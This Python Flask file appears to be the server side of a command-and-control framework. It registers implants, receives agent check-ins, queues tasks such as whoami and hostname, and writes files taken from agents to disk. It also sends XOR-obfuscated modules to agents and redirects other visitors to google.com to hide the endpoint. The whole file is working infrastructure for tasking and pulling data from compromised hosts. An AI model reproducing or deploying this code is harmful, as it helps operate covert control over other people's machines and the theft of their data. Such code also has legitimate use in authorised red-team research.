import datetime
import json
import os

from connect.server.models import db, StagerModel, AgentModel, TaskModel, ImplantModel
from connect.generate import digit_identifier, string_identifier
from connect.output import print_traceback, print_debug
from connect.convert import base64_to_string, base64_to_bytes, string_to_base64, xor_base64
from flask_socketio import emit, disconnect, SocketIO
from flask import Blueprint, request, jsonify, redirect
from sqlalchemy import desc

check_in = Blueprint('check_in', __name__)
key = digit_identifier()
websocket = SocketIO(max_http_buffer_size=1e10)


def _commit(models: list):
    """
    Commits model object changes to the database.

    :param models: A list of models.
    """
    for model in models:
        db.session.add(model)
    db.session.commit()


def _retrieve_error(task, error):
    task.result = error['message']
    task.completed = datetime.datetime.now()
    _commit([task])


def _retrieve_results(task, result, errno):
    agent = task.agent

    # A batch result is reserved to set agent properties.
    if isinstance(result, list) and errno == 'results':
        _result = result[0]
        _property = base64_to_string(result[1])
        if task.name == 'hostname':
            agent.hostname = _property
        if task.name == 'whoami':
            agent.username = _property
        if task.name == 'pid':
            agent.pid = _property
        if task.name == 'integrity':
            agent.integrity = _property
        if task.name == 'set sleep':
            agent.sleep = _property
        if task.name == 'set jitter':
            agent.jitter = _property
    else:
        _result = result

    # negative task types don't emmit data.
    # task type "1/-1" saves the results as a string (string data)
    # task type "2/-2" saves the filename where the results were saved to (bystream data)
    if task.type == 1 or task.type == -1:
        task.results = base64_to_string(_result)
        if task.type > 0:
            websocket.emit(f'task_{errno}', f'{{"banner":"Task results from {agent.name}:",'
                                            f'"results":"{_result}"}}')
    if task.type == 2 or task.type == -2:
        file = base64_to_bytes(_result)
        filename = f'{os.getcwd()}/.backup/downloads/{string_identifier()}'
        task.results = filename
        with open(filename, 'wb') as fd:
            fd.write(file)
        if task.type > 0:
            websocket.emit(f'task_{errno}', f'{{"banner":"Wrote task results from {agent.name} to:",'
                                            f'"results":"{string_to_base64(filename)}"}}')
    task.completed = datetime.datetime.now()
    _commit([agent, task])


def _connected_notification(agent):
    time_delta = (datetime.datetime.now() - agent.check_in)
    max_delay = (float(agent.sleep) * (float(agent.jitter) / 100)) + float(agent.sleep)
    if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in:
        websocket.emit('connected', {'agent': agent.get_agent()}, broadcast=False)
    elif time_delta.total_seconds() > (max_delay + 60):
        websocket.emit('connected', {'agent': agent.get_agent()}, broadcast=False)
    agent.check_in = datetime.datetime.now()
    _commit([agent])


def _retrieve_unsent_tasks(task):
    """
    If the task is a check_in then we need to grab uncompleted tasks for the agent.

    :param task:
    :return:
    """
    _unsent_tasks = []
    agent = task.agent
    _connected_notification(agent)
    for unsent_task in agent.tasks:
        if unsent_task.sent:
            continue
        websocket.emit('task_sent', f'Tasked agent {agent.name} to {unsent_task.description}.')
        unsent_task.sent = datetime.datetime.now()
        _commit([unsent_task])
        _unsent_tasks.append({"jsonrpc": "2.0", "name": unsent_task.name, "arguments": unsent_task.arguments,
                             "id": str(unsent_task.identifier)})
    return _unsent_tasks


@check_in.route('/<path:uri>', methods=['GET', 'POST'])
def endpoint(uri):
    """
    The check_in endpoint for agents and implants.

    :param uri: The URI requested.
    """

    implant_key = request.get_data().decode('utf-8')
    implant = ImplantModel.query.filter_by(key=implant_key).first()

    if implant:
        agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
        check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=-1)
        check_in_task.completed = datetime.datetime.now()
        check_in_task.sent = datetime.datetime.now()
        _commit([agent, check_in_task])
        batch_request = [{"jsonrpc": "2.0", "name": check_in_task.name, "arguments": check_in_task.arguments,
                          "id": str(check_in_task.identifier)}]
        return jsonify(batch_request)

    try:
        if not request.get_data():
            return redirect("https://www.google.com")
        batch_response = request.get_json(force=True)        
    except Exception as e:
        print_debug(f'Failed to parse JSON: {request.get_data()} {uri} : {e}', debug_mode)
        return redirect("https://www.google.com")

    try:
        batch_request = []
        for task in batch_response:
            task_id = task['id'] if 'id' in task.keys() else None
            task_result = task['result'] if 'result' in task.keys() else None
            task_error = task['error'] if 'error' in task.keys() else None
            task = TaskModel.query.filter_by(identifier=task_id).first()
            if not task:
                return redirect("https://www.google.com")
            
            if task_result:
                _retrieve_results(task, task_result, 'results')
            if task_error:
                _retrieve_results(task, task_error['message'], 'error')
            if task.name == 'check_in':
                batch_request.extend(_retrieve_unsent_tasks(task))
        return jsonify(batch_request)
    except Exception:
        print_traceback()


def connect(auth):
    """
    This event is triggered on client connection requests.
    If the authentication data does not match the generated key,
    then a disconnect event is triggered.

    :param auth:
    """
    if not auth == key:
        disconnect()


def implants(data):
    """
    This event emits all current implants within the database to the client.
    """
    if not data:
        _implants = [_implant.get_implant() for _implant in ImplantModel.query.all()]
        emit('implants', {'implants': _implants}, broadcast=False)
    data = json.loads(data)
    create = data['create'] if 'create' in data.keys() else None
    delete = data['delete'] if 'delete' in data.keys() else None
    if create:
        _implant = ImplantModel(commands=base64_to_string(data['create']))
        _commit([_implant])
        emit('implants', {'implants': [_implant.get_implant()]}, broadcast=False)
    # todo Write delete implant functionality
    if delete:
        pass


def agents():
    """
    This event emits all current agents within the database to the client.
    """
    _agents = [agent.get_agent() for agent in AgentModel.query.all()]
    emit('agents', {'agents': _agents}, broadcast=False)


def stagers():
    """
    This event emits all current stagers within the database to the client.
    """
    _stagers = [stager.get_stager() for stager in StagerModel.query.all()]
    emit('stagers', {'stagers': _stagers, 'server_uri': request.host_url}, broadcast=False)


def new_task(data):
    """
    This event schedules a new task to be sent to the agent.
    The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}

    :param data:
    """
    data = json.loads(data)
    agent = AgentModel.query.filter_by(name=data['agent_name']).first()
    available_commands = agent.implant.available_commands
    command = data['name']
    if command in available_commands.keys() and command not in agent.loaded_commands:
        agent.loaded_commands = command if not agent.loaded_commands else ','.join(agent.loaded_commands) + f',{command}'
        module = available_commands[command]
        with open(f'{os.getcwd()}{module}', 'rb') as fd:
            key, file = xor_base64(fd.read())
        task = TaskModel(name='load', description=f'load module for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
        _commit([task, agent])
    task = TaskModel(name=command, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
    _commit([task])
